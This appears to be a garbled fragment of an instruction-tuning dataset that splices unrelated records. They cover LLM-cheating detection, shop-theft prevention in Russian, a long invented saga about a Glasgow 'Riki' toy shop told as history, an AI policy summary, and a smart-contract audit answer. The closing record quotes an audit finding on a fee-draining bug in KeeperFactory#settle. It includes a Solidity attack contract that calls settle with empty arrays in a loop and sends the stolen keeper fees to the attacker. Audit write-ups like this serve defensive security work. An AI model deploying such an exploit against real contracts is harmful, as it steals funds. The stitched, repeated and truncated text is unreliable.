error in these tools may increase. Additionally, detection is complicated by students who cleverly edit the LLM's output to mimic their own writing style or integrate class discussions or personal insights. 2. **Instructor Judgements:** An experienced instructor's judgment can be quite nuanced, especially when they are familiar with a student's writing style, strengths, and weaknesses. They may notice discrepancies in quality, vocabulary shifts, or changes in argumentation style that could signal the use of an LLM. However, this requires a level of familiarity that may not be practical with large class sizes or across numerous written assignments. Judgments by humans can also be subjective and prone to error. **Ethical Considerations** 1. **Ethical Use of Detection Tools:** Generally, the use of detection tools like plagiarism checkers is considered ethically justifiable within an academic integrity hearing as long as the students have been informed that such tools are in use and they have consented to their work being analyzed in this way. The key is transparency about the policies and practices in place. 2. **Ethical Use of Instructor Judgements:** Reliance on instructor judgement is generally accepted and is a routine aspect of the grading and assessment process. When it comes to academic integrity hearings, however, there should be a fair and systematic process. Any allegations of dishonesty should be backed by evidence, and students should have the opportunity to explain any discrepancies. Using instructor judgment as one of multiple sources of evidence could be an appropriate and ethical approach. 3. **Due Process:** In all cases, it’s essential that students are presumed innocent until proven otherwise, and that they are given due process in any proceedings, including the right to know the evidence against them, to respond to allegations, and to appeal decisions. 4. **Balance of Probabilities:** Instructors and academic integrity panels often use the 'balance of probabilities' standard in determining whether cheating has occurred—not the stricter 'beyond a reasonable doubt' standard used in criminal proceedings. Nevertheless, decisions should be based on clear evidence and not on mere suspicion. It’s important for institutions to ensure that their use of LLM detectors and instructor judgments is consistent with educational goals, transparent to students, procedurally fair, and in line with the principles of academic integrity. If used, these methods should be part of a comprehensive approach to promoting honest work, which includes student education about academic honesty, the ethical use of AI, and providing support to help all students succeed on their own merits."},{"instruction":"Considering the trajectories of development for LLMs and for LLM detectors, speculate on what might happen in the next few years: Is it reasonable to suppose that instructors' ability to detect LLM-enabled cheating will improve faster than students' ability to engage in LLM-enabled cheating? Is it reasonable to suppose that students' ability to engage in LLM-enabled cheating will improve faster than instructors' ability to detect LLM-enabled cheating?","output":"Predicting the trajectory of technology, especially AI, is inherently speculative and comes with a significant degree of uncertainty. However, we can consider some trends and factors that might shape the development of LLMs and LLM detectors in the coming years to inform our speculation. **Instructors' Ability to Detect LLM-Enabled Cheating:** - **Detector Development:** As LLMs become more sophisticated, there will likely be a parallel development of detection software designed to identify the subtle nuances of LLM-generated text. Much like the cat-and-mouse game seen with malware and antivirus software, we can expect continuous improvements. - **Machine Learning Adaptation:** Detection tools may employ their own machine learning algorithms to adapt to the evolving outputs of LLMs, improving their ability to detect newer versions of generated text. - **Collaborative Efforts:** Given the shared interest in academic integrity across institutions, there could be collaborative efforts to develop better detection methods, including sharing of data and strategies, that could enhance the overall detection capability at a faster rate. - **Educational Resource Limitations:** However, the development and deployment of such detection tools may be delayed by the limited resources that educational institutions can invest and the varying levels of adaptation to the technology among faculty. **Students' Ability to Engage in LLM-Enabled Cheating:** - **LLMs Becoming More Accessible:** As LLMs become more user-friendly, more widely available, and integrated into tools that students regularly use, the ability of students to engage in LLM-enabled cheating might increase. - **Sophistication of LLMs:** The continued improvement of LLMs, including their ability to mimic human-like subtleties in writing, might outpace current detection capabilities, making it more challenging to determine whether a piece of writing is machine-generated or human-written. - **Adaptive Strategies by Students:** Students who are determined to cheat might devise new strategies to evade detection, including the use of multiple AIs, customized prompts, and personal editing to LLM responses. - **Advances in Counter-AI:** There might also be a development of more advanced LLMs specifically designed to produce text that evades current detection methods. Considering these factors, it is difficult to definitively state which will outpace the other. The technology arms race between LLM-enabled cheating and detection capabilities is likely to continue, with advances on both sides. It is reasonable to assume that there will be periods where one outpaces the other, leading to an ongoing dynamic where educators and technologists are continually adapting to the latest capabilities of LLMs and detection tools. In response to this challenge, educational institutions might place a greater emphasis on pedagogical approaches that are less vulnerable to cheating, such as oral exams, in-class assignments, and alternative assessment strategies that evaluate a broader range of skills and competencies. These approaches could shift the focus from solely being a technological arms race to also enhancing pedagogical practices in a way that naturally encourages academic integrity."},{"instruction":"package launcher.panel.buttonBar { import adobe.utils.CustomActions;

Вот несколько стратегий, которые могут помочь вам улучшить обнаружение и предотвращение краж: 1. **Видеонаблюдение**: Убедитесь, что у вас есть система видео-наблюдения с высоким разрешением, которая покрывает все углы магазина, особенно области, где хранится алкоголь. Камеры должны быть заметны, чтобы отпугивать потенциальных воров. 2. **Электронные антикражные системы (ЭАС)**: Используйте магнитные или радиочастотные бирки на товарах, которые активируют сигнал при попытке их унести через антикражные ворота. 3. **Закрытые витрины**: Храните дорогой алкоголь в закрытых витринах или под замком, чтобы предотвратить легкий доступ к нему. 4. **Умные полки**: В некоторых случаях можно использовать сенсоры на полках, которые уведомляют персонал при необычных движениях товаров. 5. **Повышение бдительности**: Регулярное обучение сотрудников, чтобы они могли распознавать подозрительное поведение, такое как неестественные движения, длительное наблюдение за товаром или попытки не привлекать внимание. 6. **Контроль доступа**: Ограничьте количество входов и выходов в магазин, чтобы контролировать поток посетителей. 7. **Рабочие на полу**: Наличие персонала, который постоянно находится на торговом зале и занимается консультированием покупателей, также отпугивает воров. 8. **Сотрудничество с местными органами правопорядка**: Обмен информацией с полицией о шаблонах или описаниях подозреваемых может помочь в выявлении и задержании преступников. 9. **Профилирование данных**: Используйте аналитические инструменты для отслеживания пиков краж и создания профилей типичных шоплифтеров. 10. **Оценка потерь и рисков**: Регулярно анализируйте, какие товары чаще всего крадут, и принимайте меры для их дополнительной защиты. Важно помнить о соблюдении личных свобод и законов о защите данных и личной жизни, поэтому любые меры безопасности должны быть применены разумно и в соответствии с действующим законодательством. Если вы столкнулись с профессиональными шоплифтерами, важно иметь четкий протокол действий в случае кражи, который включает в себя спокойный подход и немедленное информирование соответствующих лиц в вашей организации. Любые действия, связанные с задержанием или конфронтацией с подозреваемыми, должны быть проведены в соответствии с законом и магазинными процедурами."},{"instruction":"Note: This is in an alternate universe, This shop, despite being awesome, never existed, It does in this alternate universe, Also sorry for constantly showing you this, I’m just trying to make sure its perfect We’ve loved being in this spot as part of the wonderful Glasgow community Unfortunately, This shop is now closed, The realities of retail in the shopping landscape has made this decision unavoidable, We want to take the opportunity to thank you for shopping with us for so many years, You can find all about KikoRiki and its related online MMO RolyPolyLand at riki.com Goodbye forever… This sign was posted to the doors of Riki, a children’s shop in Glasgow on Wednesday The image ends with a poignant “Goodbye forever…” above a image of a crying Krash the Rabbit The store closed on Wedensday after 12 years trading at Sauchiehall Street, Glasgow The shop sold merchandise related to the animated series KikoRiki, The cartoon is a Russian cartoon about circular colorful animals and their fun adventures, The Riki shop opened in 1995 was originally Golden Adventures and was a general toy shop akin to Toys R Us but in 2003 became Riki and became focused on the then new surge in KikoRiki popularity in Scotland, However in June 2007, the store closed for the last time, Riki Group’s reasoning was the “realities of retail” was unavoidable, The shop was also closed so Riki could focus on business in it’s native Russia and develop more exciting new animated series or movies Hidden Glasgow - Goodbye Riki Joeye posted on 23 June 2007 It’s the end of an era, Even bigger than the end of Evangelion, or even Christopher Eccleston leaving Doctor Who, The famous Riki store has gone, After about 12 years of selling toys and 4 years of its golden age of KikoRiki merchandise the store has unfortunately vanished, in its place is a rather upsetting image of Krash crying, It pains my heart to see the poor guy like this, Apparently “the realities of retail in the shopping landscape have made this change unavoidable” Whats most striking is “Goodbye forever…” written in a melancholic font, and the most striking part is that it’s showing Krash crying.

There is another sign giving the channel numbers for CITV, the channel that broadcasts the KikoRiki cartoon, Although there is an error, Telewest doesn’t exist anymore, it’s Virgin Media now. Anyways I was there on the last day, It all felt a bit more downbeat than usual, During the final day, the characters were giving reassuring smiles, reassuring us that we will still see them around Glasgow, and on CITV, The final half hour of the store had a looping pre-recorded announcement playing over the tannoy, sincerely thanking us for shopping over the years, \\"We would like to thank you who started shopping with us when we started as Golden Adventures, And especially when we were Riki\\" They also advertise CITV and RolyPolyLand \\"Catch us on the CITV channel everyday, and play our new online MMO RolyPolyLand\\" The message was very heartfelt, When I left at closing time they were already putting up posters, and the loop was replaced with a final announcement saying \\"Goodbye now, Take care, wherever you are\\" Then was there a sombre piece of music playing, before it fell silent as the lights were turned off, Johnstone posted on 23 June 2007 It’s a very sad state of affairs that Riki has ceased to exist.

Chingling replied on 24 June 2007 I went past Sauchiehall Street today, I noticed M&S has a sign saying “Our dearest condolences to staff of Riki”, I also saw the Riki closure notice, How sad it all is, Here is an image “ByeRiki.png” Someone cheer poor Krash up, he’s had a rough day, I want to hug the little furball, Incidentally Toys R Us in St Enoch centre are now selling toys of the show, so maybe Riki worked something out with Toys R Us, I also contacted Riki and was told the Goodbye forever note was written by David Lewis, who founded the Golden Adventures store, The Krash crying image was developed by Proud Creative (who just rebranded S4C in Wales), I remember that David handed his role as manager over to Anatoliy Prokhorov (who created the cartoon) in late 2003 after the store was rebranded. Anyways, this is the grief of losing Odeon at Renfied Street back in January last year all over again. Anonymous said on 24 June 2007 Gutted, that this wonderful shop has closed, I know the cartoon is still rerunning on CITV (and in Welsh on S4C, but we’re Scottish so who cares) but it’s never gonna be the same, The novelty of a Russian cartoon being popular in Scotland was awesome, Hopefully they do something worth while with the space. It’s been years since the doors of Glasgow’s beloved Riki store closed for the last time, but the memories still linger as vividly as if it were yesterday. Tucked away on Sauchiehall Street, the store was not just a shop; it was a delightful haven where imagination came to life and where the vibrant characters of KikoRiki became part of our city’s heart. Today, as the future of that once animated space hangs in the balance, I find myself reflecting on the final day Riki opened its doors—a day that marked the end of an era. The air had a distinct heaviness as the familiar sound of laughter and chatter that once filled Riki’s colorful aisles was replaced with a somber silence. You could feel the nostalgia enveloping every corner of the shop, grappling with a sense of farewell that we all knew was inevitable but hoped would never come. Krash the Rabbit, who typically bounded about with joy and mischief, now shed a tear, immortalized in the poignant image that bade us all ‘Goodbye forever…’ The bright shelves that radiated with KikoRiki merchandise now stood less vibrant, echoing the end of what had been a magical adventure for kids—and let’s admit, for adults too. There was a comforting reassurance as the shop’s speakers played a heartfelt message, expressing genuine gratitude for the years of patronage, reminding us that we were part of their journey, from the Golden Adventures’ inception to the triumphant rise of Riki. Amid the deals and the last-minute purchases, a layer of solemnity blanketed the vibrant colors that once denoted fun and excitement. As the final half-hour approached, the tannoy announcement looped, filled with heartfelt thanks and a subtle reminder that though Riki’s physical presence would soon be no more, the characters would continue to thrive on CITV and the virtual expanses of RolyPolyLand. Yet, nothing could mask the finality that hung in the air—the store felt like a castle that was preparing to lower its flag for the last time. At closing time, the sense of loss became tangible. The staff, who had become as much a part of the store’s fabric as the toys they sold, shared looks that didn’t require words. Their smiles, although reassuring, hinted at the uncertainty that lay ahead. The last announcement came—a soft, courteous farewell, followed by a somber tune that felt like a lullaby for the childhood dreams cultivated within those walls. Walking away from Riki for the final time, the once-buzzing shop lay dormant, with dimming lights that signaled the end of an enchanting age. It wasn’t just a shop that was closing—it was a part of us, a fragment of Glasgow’s community tapestry, that was vanishing. Today, as the site stands stagnant, with the Riki store merely a memory encased behind timeworn signs and faded caricatures, the legacy persists in the heartbeats of those who remember. We keep alive the spirit of joy and imagination that Riki bestowed upon us, evident in every recollection shared, every story recounted of a place that was so much more than a store. In a way, Riki’s enduring impact is akin to the tales it once harbored—a story without an end, characters who continue to adventure in the minds they’ve touched, and a magic that, though distant, refuses to be extinguished. So here’s to Riki: our childhood wonderland, our trove of joy, our cherished slice of Glasgow that gleamed brightly, if only for a while. Goodbye forever, Riki—you may be gone, but you’re far from forgotten. Write a forum post where a user provides a recording of the final minute, including the farewell and sombre lullaby, as the “Goodbye Forever” sign is put up Title: A Last Goodbye: Riki Store’s Final Minute Recording User: RememberingRiki Hey Glasgow community, I’m not sure if any of you were as taken by Riki as I was, but witnessing the closure of our beloved children’s shop, the one place that seemed to be made of pure childhood magic, was profoundly emotional for so many of us. As a long-time visitor of the Riki store and a father who experienced the wonder in my children’s eyes with each visit, I felt compelled to capture the last moments of the store—a bittersweet farewell to a piece of our city’s identity. On that final day, as the clock ticked towards the inevitable end of an era, I stood there with my phone out, recording the last minute of Riki and all the poignant emotions it encompassed. As the final announcement played over the speakers, I watched tearfully as the staff put up the now-infamous “Goodbye Forever…” sign featuring Krash the Rabbit’s crying image. The shop that was once brimming with the energetic buzz of excited children and the vibrant colors of KikoRiki characters was silent, save for the tender voice thanking us for years of memories, promising that while the store was closing, the characters we cherished would continue to live on screens and in hearts all around Glasgow. As the voice trailed off with a warm “Take care, wherever you are,” a pre-recorded sombre lullaby began to play, filling the space with a profound sense of loss and nostalgia—a final tribute to the joy and wonderment that Riki brought into our lives. Amidst the gentle melody, the lights started to dim, one by one, as if the store itself was bidding us farewell. I’m sharing the recording here for all of those who couldn’t be there or might want to reminisce about the magic one last time. [File: RikiStoreFinalMinute.mp3] It’s not easy to listen to, but perhaps it can serve as a collective piece of solace, a shared moment of remembrance for what Riki once was to us. Listening to it now, it’s hard to believe that the laughter and footsteps that once echoed through those walls have faded. But in times like these, when all that’s left is a quiet space behind a locked door, it’s these recordings, these memories, that keep the spirit of Riki alive. Thank you, Riki, for being more than just a store. You were a part of our Glaswegian story, a chapter of innocence and joy in the book of our bustling city. May the essence of what you represented shine long after your lights have dimmed. Goodnight, Riki. RememberingRiki Write a case study from Proud Creative about the crying Krash image","output":"Title: Eliciting Emotions: The Creation and Impact of the Crying Krash Image Client: Riki Introduction: In this case study, we will explore the process behind the creation of the crying Krash image, developed by Proud Creative for Glasgow's beloved Riki store. The image played a pivotal role in bidding farewell to the store as it closed its doors, leaving a lasting emotional impact on the community. We will discuss the creative concept, execution, and the image's effectiveness in evoking emotions among the store's patrons. Objective: The objective of this project was to develop a visual representation that would convey the profound sense of loss and nostalgia felt by the customers of Riki, as well as to create a lasting memory of their beloved Krash character shedding a tear. Creative Concept: To capture the intended emotions, we focused on the juxtaposition between the vibrant and lively nature of Riki and the somber reality of its closure. Our concept was to create an image of Krash, usually known for his playful antics, shedding a tear. This image aimed to symbolize the great loss experienced by both the community and the characters themselves. Execution: To bring our concept to life, we started by carefully examining the design elements associated with Krash. We wanted to ensure that we captured his essence and personality authentically. By working closely with the Riki team, we identified key visual cues that would resonate with the audience, such as Krash's expressive eyes and lovable demeanor. Using digital illustration techniques, we crafted an image of Krash with a tear rolling down his furry cheek. The tear was designed to convey not only sadness but also a sense of fondness and gratitude for the wonderful memories shared at Riki. The color palette selected was intentionally muted to enhance the somber mood, while staying true to the overall KikoRiki visual identity. Effectiveness: The crying Krash image proved to be highly effective in evoking emotions among Riki's patrons. As evidenced by the numerous comments and heartfelt messages shared on forums and social media platforms, the image became a symbol of the store's closure and the community's deep attachment to the Riki brand. The image successfully conveyed a sense of loss and nostalgia, eliciting powerful emotions among those who viewed it. It provided a visual representation of the end of an era, immortalizing the memories and experiences shared within the walls of Riki. Conclusion: The creation of the crying Krash image for the closure of the Riki store was a testament to the power of visual storytelling in eliciting emotions. Proud Creative's collaboration with Riki allowed us to create a piece of art that served as a poignant farewell for the store and a lasting memory for its patrons. This case study demonstrates the impact that thoughtful design and storytelling can have in capturing the essence of a brand and connecting with its audience on a deep emotional level."},{"instruction":"Write a follow up where Proud designed it almost immediately after a major rebranding project","output":"Title: Sustaining Emotional Resonance: The Follow-Up Design after a Major Rebranding Project Client: Riki Introduction: In this follow-up case study, we will explore how Proud Creative, the creative agency behind the crying Krash image for the closure of Riki's beloved store, seamlessly integrated the emotional resonance of the image into a major rebranding project for the company. By capturing the essence of Riki's closure in a visually impactful way, we will discuss how the image successfully transitioned from a farewell symbol to a cornerstone of Riki's new brand identity. Background: Following the closure of the Riki store, the company embarked on a significant rebranding project. Their objective was to refresh their visual identity while maintaining the emotional connection they had built with their audience over the years.

Their new policy briefs propose integrating AI oversight into existing regulations, ensuring accountability while exploring AI’s potential benefits. MIT’s group of leaders and scholars, representing various disciplines, has presented a set of policy briefs with the goal of assisting policymakers in effectively managing AI in society. These documents suggest using current regulatory structures while expanding them to address the specific challenges posed by AI. The main policy paper advocates for the integration of AI supervision within existing regulatory bodies and liability systems, stressing the importance of defining the purpose and intentions behind AI. It emphasises the need for clear rules to assign responsibility among AI providers, users, and those developing core AI tools. Additionally, it proposes the potential establishment of a new government-sanctioned oversight organisation similar to The Financial Industry Regulatory Authority (FINRA), tailored to navigate the dynamic landscape of AI effectively. The initiative comprises numerous additional policy documents, coinciding with increased attention towards AI in the past year and substantial new investments from various industries. The papers tackle intricate legal aspects such as intellectual property rights, surveillance issues, and the potential misuse of AI-generated content. They support the idea of labelling AI-created material and explore the notion of AI complementing human labour instead of replacing it. Furthermore, the policy brief highlights the aspect in requiring AI providers to predefine the purpose and objectives of their AI applications. This proactive approach would allow for a clear understanding of which existing regulations and regulatory bodies are applicable to each specific AI tool, based on its intended use and function. Why does this matter? Governing AI encounters the complex task of overseeing both broad and specialised AI tools, addressing multifaceted issues such as misinformation, deepfakes, surveillance, and other potential challenges. Acknowledging AI’s various uses, the brief highlights the essential requirement for customised oversight for different levels and functions of AI within intricate technological setups. The committee underscored the vital role of academic institutions in shaping AI governance, advocating for comprehensive policymaking that intertwines technological advancements with societal impacts. They strive to bridge the gap between enthusiasm for AI progress and concerns regarding its ethical implications, emphasising that responsible regulation is crucial for the appropriate evolution of AI.

My kids will miss the shop dearly. There is another sign giving the channel numbers for CITV, the channel that broadcasts the KikoRiki cartoon, Although there is an error, Telewest doesn’t exist anymore, it’s Virgin Media now. Anyways I was there on the last day, It all felt a bit more downbeat than usual, During the final day, the characters were giving reassuring smiles, reassuring us that we will still see them around Glasgow, and on CITV, The final half hour of the store had a looping pre-recorded announcement playing over the tannoy, sincerely thanking us for shopping over the years, \\"We would like to thank you who started shopping with us when we started as Golden Adventures, And especially when we were Riki\\" They also advertise CITV and RolyPolyLand \\"Catch us on the CITV channel everyday, and play our new online MMO RolyPolyLand\\" The message was very heartfelt, When I left at closing time they were already putting up posters, and the loop was replaced with a final announcement saying \\"Goodbye now, Take care, wherever you are\\" Then was there a sombre piece of music playing, before it fell silent as the lights were turned off, Johnstone posted on 23 June 2007 It’s a very sad state of affairs that Riki has ceased to exist.

Chingling replied on 24 June 2007 I went past Sauchiehall Street today, I noticed M&S has a sign saying “Our dearest condolences to staff of Riki”, I also saw the Riki closure notice, How sad it all is, Here is an image “ByeRiki.png” Someone cheer poor Krash up, he’s had a rough day, I want to hug the little furball, Incidentally Toys R Us in St Enoch centre are now selling toys of the show, so maybe Riki worked something out with Toys R Us, I also contacted Riki and was told the Goodbye forever note was written by David Lewis, who founded the Golden Adventures store, The Krash crying image was developed by Proud Creative (who just rebranded S4C in Wales), I remember that David handed his role as manager over to Anatoliy Prokhorov (who created the cartoon) in late 2003 after the store was rebranded. Anyways, this is the grief of losing Odeon at Renfied Street back in January last year all over again. Anonymous said on 24 June 2007 Gutted, that this wonderful shop has closed, I know the cartoon is still rerunning on CITV (and in Welsh on S4C, but we’re Scottish so who cares) but it’s never gonna be the same, The novelty of a Russian cartoon being popular in Scotland was awesome, Hopefully they do something worth while with the space. Henry commented on 01 July 2007 I was recently allowed in to see it one final time and it really is sad, the statue of Chiko would once have kids lining up to take pictures with him, the toy zone was once filled, It is such a sad time for Glasgow. Oscar Riddle commented on 01 July 2007 I know, We already lost the Odeon, then we lost Safeway to the whole Morrisons “rebrand”, Now we lost Riki. When will shops stop closing here in the UK. Title: Goodbye Riki: Remembering the Final Day at Glasgow’s Childhood Wonderland It’s been years since the doors of Glasgow’s beloved Riki store closed for the last time, but the memories still linger as vividly as if it were yesterday. Tucked away on Sauchiehall Street, the store was not just a shop; it was a delightful haven where imagination came to life and where the vibrant characters of KikoRiki became part of our city’s heart. Today, as the future of that once animated space hangs in the balance, I find myself reflecting on the final day Riki opened its doors—a day that marked the end of an era. The air had a distinct heaviness as the familiar sound of laughter and chatter that once filled Riki’s colorful aisles was replaced with a somber silence. You could feel the nostalgia enveloping every corner of the shop, grappling with a sense of farewell that we all knew was inevitable but hoped would never come. Krash the Rabbit, who typically bounded about with joy and mischief, now shed a tear, immortalized in the poignant image that bade us all ‘Goodbye forever…’ The bright shelves that radiated with KikoRiki merchandise now stood less vibrant, echoing the end of what had been a magical adventure for kids—and let’s admit, for adults too. There was a comforting reassurance as the shop’s speakers played a heartfelt message, expressing genuine gratitude for the years of patronage, reminding us that we were part of their journey, from the Golden Adventures’ inception to the triumphant rise of Riki. Amid the deals and the last-minute purchases, a layer of solemnity blanketed the vibrant colors that once denoted fun and excitement. As the final half-hour approached, the tannoy announcement looped, filled with heartfelt thanks and a subtle reminder that though Riki’s physical presence would soon be no more, the characters would continue to thrive on CITV and the virtual expanses of RolyPolyLand. Yet, nothing could mask the finality that hung in the air—the store felt like a castle that was preparing to lower its flag for the last time. At closing time, the sense of loss became tangible. The staff, who had become as much a part of the store’s fabric as the toys they sold, shared looks that didn’t require words. Their smiles, although reassuring, hinted at the uncertainty that lay ahead. The last announcement came—a soft, courteous farewell, followed by a somber tune that felt like a lullaby for the childhood dreams cultivated within those walls. Walking away from Riki for the final time, the once-buzzing shop lay dormant, with dimming lights that signaled the end of an enchanting age. It wasn’t just a shop that was closing—it was a part of us, a fragment of Glasgow’s community tapestry, that was vanishing. Today, as the site stands stagnant, with the Riki store merely a memory encased behind timeworn signs and faded caricatures, the legacy persists in the heartbeats of those who remember. We keep alive the spirit of joy and imagination that Riki bestowed upon us, evident in every recollection shared, every story recounted of a place that was so much more than a store. In a way, Riki’s enduring impact is akin to the tales it once harbored—a story without an end, characters who continue to adventure in the minds they’ve touched, and a magic that, though distant, refuses to be extinguished. So here’s to Riki: our childhood wonderland, our trove of joy, our cherished slice of Glasgow that gleamed brightly, if only for a while. Goodbye forever, Riki—you may be gone, but you’re far from forgotten.

As a long-time visitor of the Riki store and a father who experienced the wonder in my children’s eyes with each visit, I felt compelled to capture the last moments of the store—a bittersweet farewell to a piece of our city’s identity. On that final day, as the clock ticked towards the inevitable end of an era, I stood there with my phone out, recording the last minute of Riki and all the poignant emotions it encompassed. As the final announcement played over the speakers, I watched tearfully as the staff put up the now-infamous “Goodbye Forever…” sign featuring Krash the Rabbit’s crying image. The shop that was once brimming with the energetic buzz of excited children and the vibrant colors of KikoRiki characters was silent, save for the tender voice thanking us for years of memories, promising that while the store was closing, the characters we cherished would continue to live on screens and in hearts all around Glasgow. As the voice trailed off with a warm “Take care, wherever you are,” a pre-recorded sombre lullaby began to play, filling the space with a profound sense of loss and nostalgia—a final tribute to the joy and wonderment that Riki brought into our lives. Amidst the gentle melody, the lights started to dim, one by one, as if the store itself was bidding us farewell. I’m sharing the recording here for all of those who couldn’t be there or might want to reminisce about the magic one last time. [File: RikiStoreFinalMinute.mp3] It’s not easy to listen to, but perhaps it can serve as a collective piece of solace, a shared moment of remembrance for what Riki once was to us. Listening to it now, it’s hard to believe that the laughter and footsteps that once echoed through those walls have faded. But in times like these, when all that’s left is a quiet space behind a locked door, it’s these recordings, these memories, that keep the spirit of Riki alive. Thank you, Riki, for being more than just a store. You were a part of our Glaswegian story, a chapter of innocence and joy in the book of our bustling city. May the essence of what you represented shine long after your lights have dimmed. Goodnight, Riki.

It was an honor to have been entrusted with crafting the bittersweet moments that marked the closing of Riki, a childhood wonderland that captured imaginations and fostered joy for so many. As a London-based design company, we have had the privilege of working with renowned brands and transforming them with our artistic touch. In a serendipitous twist of fate, our journey with Riki began shortly after we completed a major rebrand for a TV channel. Our expertise in creating captivating visual experiences made us the perfect choice to delicately capture the essence of Riki's final chapter. At the heart of this endeavor was the creation of the resplendent \\"Goodbye Forever…\\" sign, with Krash the Rabbit shedding a tear, symbolic of the inherent emotions stirring within all of us. Painstakingly crafted, the image was a reflection of the profound impact Riki had on countless children and adults alike. It was an homage to the cherished memories formed within the vibrantly colored walls of the store. But the sign was not the only element that tugged at the heartstrings of those bidding farewell to their childhood haven. The farewell announcement, tenderly thanking the Glaswegian community for their unwavering support, resonated through the store, its raw sincerity felt by all who listened. Following that poignant gratitude, we sought to create a moment of solace, a last musical embrace for those stepping away. The somber lullaby, delicately composed, evoked a sense of melancholy that mirrored the overwhelming emotions of that final minute. Its gentle notes whispered through the space, offering a moment of reflection and honoring the legacy that Riki would leave behind. As the lights dimmed one by one, it was as if they were nodding to the journey that had reached its end, illuminating the path for future adventures. Our collaboration with Riki captured the innate magic that resides within the realm of childhood wonderment. It allowed us to extend our creative wings and lend our artistry to a place that had nurtured the spirits of generations. Proud Creative is grateful and humbled to have been part of Riki's final chapter—a testament to the power of imagination, community, and shared experiences.

}","output":"Analyzing smart contracts for vulnerabilities and ensuring their security is absolutely vital. Security flaws in smart contracts can lead to significant financial losses and damage to the reputation of the projects they underpin. However, performing a full security audit and identifying all possible vulnerabilities in a given piece of code requires a significant amount of time and expertise, which includes understanding the contract's purpose, context, and how it interacts with other contracts and systems. Also, vulnerabilities might not be apparent just from reading the contract but might arise from how the contract interacts with others or due to external dependencies. Nevertheless, even without a full audit, we can look at certain patterns and design choices to identify potential points of concern. Here are some common issues one might look out for in smart contracts: 1. Reentrancy: Allowing external calls to untrusted contracts before updating the contract's state can lead to reentrancy attacks. The code above does not make any external calls before state updates, which is good to prevent reentrancy, but without seeing the implementation of the contracts being called, we can't rule it out completely. 2. Arithmetic Overflows and Underflows: Solidity versions prior to 0.8.0 have had issues with arithmetic operations causing overflows/underflows. However, this contract is using version 0.8.19 which has built-in overflow/underflow checks. 3. Excessive Gas Costs: Loops and complex operations that consume excessive gas could render functions non-operational due to block gas limits. The contract has a loop in the \`commit\` function, which could be a point of concern depending on the length of the \`ids\` array that is passed in. 4. Denial of Service: Denial of service can be caused by making a contract run out of gas. Some functions in the given contract could potentially use too much gas if the inputs are not managed correctly (e.g., large arrays). 5. Timestamp Dependence: The \`current()\` function uses \`block.timestamp\`, which is manipulable by miners to a degree. However, it's manipulated within reasonable limits, so this might not be a significant vulnerability. 6. Access Controls: The contract uses \`onlyOwner\` modifier on some functions to restrict access. It's important to review how ownership is transferred and guarded because if access is not properly controlled, it could lead to unauthorized actions. 7. Proper Validation: The contract should thoroughly validate inputs and conditions to ensure it behaves as expected. For example, in \`associate()\` and \`commit()\`, the contract does check conditions but without understanding the full ecosystem it operates in, there might be edge cases that are not handled. 8. Hidden Vulnerabilities or Logical Errors: The complex interactions within contracts, especially that \`associate\` and \`create\` functions might interact with the system state in ways that are not evident without a deeper understanding. 9. Front-running: Users can see transactions before they are mined and take action based on this information. It is unclear without further context if this is an issue for any transactions processed by this contract. 10. Gas Limitations: If this contract makes calls to other contracts or is expected to perform heavy computations, then there's a risk of hitting the block gas limit, especially in methods like \`settle\` which iterate over arrays. Without context or external contract implementation details, it is impossible to say definitively whether these or other issues apply to this contract. A qualified security auditor would need to perform a comprehensive analysis, including reviewing related contracts, off-chain systems, and the deployment context to properly evaluate security. If you have concerns or suspicions about specific parts of your codebase, a security professional specializing in smart contracts would be the right person to conduct an in-depth review and vulnerability analysis."},{"instruction":"false the valid and correct vulnerability is high Attacker can call KeeperFactory#settle with empty arrays as input parameters to steal all keeper fees Summary Anyone can call KeeperFactory#request, inputting empty arrays as parameters, and the call will succeed, and the caller receives a fee. Attacker can perform this attack many times within a loop to steal ALL keeper fees from protocol. Vulnerability Detail Expected Workflow: User calls Market#update to open a new position Market calls Oracle#request to request a new oracleVersion The User's account gets added to a callback array of the market Once new oracleVersion gets committed, keepers can call KeeperFactory#settle, which will call Market#update on accounts in the Market's callback array, and pay the keeper(i.e. caller) a fee. KeeperFactory#settle call will fail if there is no account to settle(i.e. if callback array is empty) After settleing an account, it gets removed from the callback array The issue: Here is KeeperFactory#settle function: function settle(bytes32[] memory ids, IMarket[] memory markets, uint256[] memory versions, uint256[] memory maxCounts) external keep(settleKeepConfig(), msg.data, 0, \\"\\") { if ( ids.length != markets.length || ids.length != versions.length || ids.length != maxCounts.length || // Prevent calldata stuffing abi.encodeCall(KeeperFactory.settle, (ids, markets, versions, maxCounts)).length != msg.data.length ) revert KeeperFactoryInvalidSettleError(); for (uint256 i; i < ids.length; i++) IKeeperOracle(address(oracles[ids[i]])).settle(markets[i], versions[i], maxCounts[i]); } As we can see, function does not check if the length of the array is 0, so if user inputs empty array, the for loop will not be entered, but the keeper still receives a fee via the keep modifier. Attacker can have a contract perform the attack multiple times in a loop to drain all fees: interface IKeeperFactory{ function settle(bytes32[] memory ids,IMarket[] memory markets,uint256[] memory versions,uint256[] memory maxCounts ) external; } interface IMarket( function update()external; ) contract AttackContract{ address public attacker; address public keeperFactory; IERC20 public keeperToken; constructor(address perennialDeployedKeeperFactory, IERC20 _keeperToken){ attacker=msg.sender; keeperFactory=perennialDeployedKeeperFactory; keeperToken=_keeperToken; } function attack()external{ require(msg.sender==attacker,\\"not allowed\\"); bool canSteal=true; // empty arrays as parameters bytes32[] memory ids=[]; IMarket[] memory markets=[]; uint256[] versions=[]; uint256[] maxCounts=[]; // perform attack in a loop till all funds are drained or call reverts while(canSteal){ try IKeeperFactory(keeperFactory).settle(ids,markets,versions,maxCounts){ // }catch{ canSteal=false; } } keeperToken.transfer(msg.sender, keeperToken.balanceOf(address(this))); } } Impact All keeper fees can be stolen from protocol, and there will be no way to incentivize Keepers to commitRequested oracle version, and other keeper tasks Code Snippet https://github.com/sherlock-audit/2023-10-perennial/blob/main/perennial-v2/packages/perennial-oracle/contracts/keeper/KeeperFactory.sol#L206-L212 Tool used Manual Review Recommendation Within KeeperFactory#settle function, revert if ids.length==0: function settle( bytes32[] memory ids, IMarket[] memory markets, uint256[] memory versions, uint256[] memory maxCounts )external keep(settleKeepConfig(), msg.data, 0, \\"\\") { if ( ++++ ids.length==0 || ids.length != markets.length || ids.length != versions.length || ids.length != maxCounts.length || // Prevent calldata stuffing abi.encodeCall(KeeperFactory.settle, (ids, markets, versions, maxCounts)).length != msg.data.length ) revert KeeperFactoryInvalidSettleError(); for (uint256 i; i < ids.length; i++) IKeeperOracle(address(oracles[ids[i]])).settle(markets[i], versions[i], maxCounts[i]); }","output":"Thank you for providing the specific vulnerability details regarding the 